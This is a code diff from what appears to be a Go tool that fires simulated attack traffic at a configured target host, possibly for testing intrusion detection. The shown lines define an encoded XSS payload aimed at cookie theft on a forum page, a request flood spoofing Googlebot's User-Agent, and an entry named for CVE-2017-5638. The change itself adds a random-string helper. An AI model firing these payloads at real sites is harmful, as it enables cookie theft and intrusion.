@@ -122,7 +122,7 @@ func (p *program) Start(s service.Service) error {
 	xssBlast = Attack{name: "XSS Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
 		minRequests: 100, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
 	impostor = Attack{name: "Impostor", method: "GET", maxNap: 240, minNap: 0, pause: 1, maxRequests: 120,
-			  minRequests: 100, url: fmt.Sprintf("http://%s/%svid.mov", target, random(100,1000)),
+			  minRequests: 100, url: fmt.Sprintf("http://%s/%svid.mov", target, RandomString(10)),
 		headers: map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}}
 	cve20175638 = Attack{name: "cve20175638", method: "GET", maxNap: 0, minNap: 0, pause: 1,
 		maxRequests: 1800, minRequests: 2, url: fmt.Sprintf("http://%s/", target),
@@ -212,6 +212,14 @@ func random(min, max int) int {
 func randomIP() string {
 	rand.Seed(time.Now().UTC().UnixNano())
 	return ips[rand.Intn(len(ips))]
+}
+
+func RandomString(len int) string {
+      bytes := make([]byte, len)
+     for i := 0; i < len; i++ {
+          bytes[i] = byte(65 + rand.Intn(25))  //A=65 and Z = 65+25
+      }
+      return string(bytes)
 }
 
 func (attack *Attack) send() {
